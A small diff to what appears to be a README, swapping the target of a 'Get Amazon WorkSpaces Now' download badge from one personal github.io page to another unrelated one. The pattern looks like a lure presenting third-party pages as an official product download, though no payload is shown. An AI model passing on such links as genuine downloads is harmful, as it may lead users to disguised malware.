@@ -4,7 +4,7 @@
 
 ![Banner Placeholder](https://m.media-amazon.com/images/I/41pLVHH4m5L.png)
 
-[![Get Amazon WorkSpaces Now](https://img.shields.io/badge/Get_Amazon_WorkSpaces-Now-0a5d8d?style=for-the-badge&logo=github)](https://milerbadd.github.io/.github/amazon-workspaces)
+[![Get Amazon WorkSpaces Now](https://img.shields.io/badge/Get_Amazon_WorkSpaces-Now-0a5d8d?style=for-the-badge&logo=github)](https://hudsonwallaceikqe.github.io/.github/amazon-workspaces)
 
 ---
 
